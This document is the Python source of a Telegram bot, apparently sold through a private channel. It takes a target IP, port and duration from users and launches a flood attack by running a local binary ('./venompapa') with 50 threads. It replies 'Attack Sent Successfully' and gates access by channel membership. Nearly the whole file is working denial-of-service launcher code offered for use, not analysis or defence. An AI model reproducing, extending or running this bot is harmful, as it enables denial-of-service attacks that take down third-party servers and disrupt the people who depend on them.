import time
import requests
import logging
from threading import Thread
import json
import hashlib
import os
import telebot
import asyncio
from datetime import datetime
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Watermark verification
CREATOR = "This File Is Made By @SahilModzOwner"
BotCode = "fc9dc7b267c90ad8c07501172bc15e0f10b2eb572b088096fb8cc9b196caea97"

def verify():
    current_hash = hashlib.sha256(CREATOR.encode()).hexdigest()
    if current_hash != BotCode:
        raise Exception("File verification failed. Unauthorized modification detected.")

verify()

# Load configuration
with open('config.json') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config['bot_token']
PRIVATE_CHANNEL_ID = -1002487608010  # Replace with your private channel ID

bot = telebot.TeleBot(BOT_TOKEN)

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Check if the user is in the private channel
def is_member_of_private_channel(user_id):
    try:
        member = bot.get_chat_member(PRIVATE_CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logging.error(f"Error checking channel membership: {e}")
        return False

# Send a not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*PLEASE JOIN MAIN CHANNEL TO GET ACCESS ⚠ :- https://t.me/+E9wRqB1L4MMxMTE1*", parse_mode='Markdown')

# Async function to run attack command
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    command = f"./venompapa {target_ip} {target_port} {duration} 50"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

        # Notify user when the attack finishes
        bot.send_message(chat_id, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀")
    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")

# Attack command
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_member_of_private_channel(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message, chat_id):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(chat_id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id), loop)
        bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} seconds")
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

# /owner command handler
@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @SahilModzOwner"
    bot.send_message(message.chat.id, owner_message)

# Welcome message and buttons for /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    username = message.from_user.username

    # Create the markup and buttons
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    btn_attack = KeyboardButton("Super ++ Attack 🚀")
    btn_account = KeyboardButton("My Account🏦")
    btn_canary_apk = KeyboardButton("Canary Apk ✔️")
    markup.add(btn_attack, btn_account)
    markup.add(btn_canary_apk)

    # Welcome message
    welcome_message = (f"Welcome, {username}!\n\n"
                       f"Please choose an option below to continue.")

    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

# Handle buttons
@bot.message_handler(func=lambda message: True)
def echo_message(message):
    try:
        if message.text == "Super ++ Attack 🚀":
            attack_command(message)
        elif message.text == "My Account🏦":
            user_id = message.from_user.id
            if not is_member_of_private_channel(user_id):
                send_not_approved_message(message.chat.id)
                return

            response = "*You are a member of the private channel:- https://t.me/+E9wRqB1L4MMxMTE1 .*"
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
        elif message.text == "Canary Apk ✔️":
            bot.send_message(
                message.chat.id,
                "Download the Canary APK: [SERVER ATTACK FINDER APK](https://t.me/c/2487608010/2373)",
                parse_mode='Markdown'
            )
        else:
            bot.send_message(message.chat.id, "Invalid option. Please choose from the available options.")
    except Exception as e:
        logging.error(f"Error in echo_message: {e}")

# Start asyncio thread
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

# Start the bot
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    loop = asyncio.new_event_loop()
    thread = Thread(target=start_asyncio_thread)
    thread.start()
    bot.polling()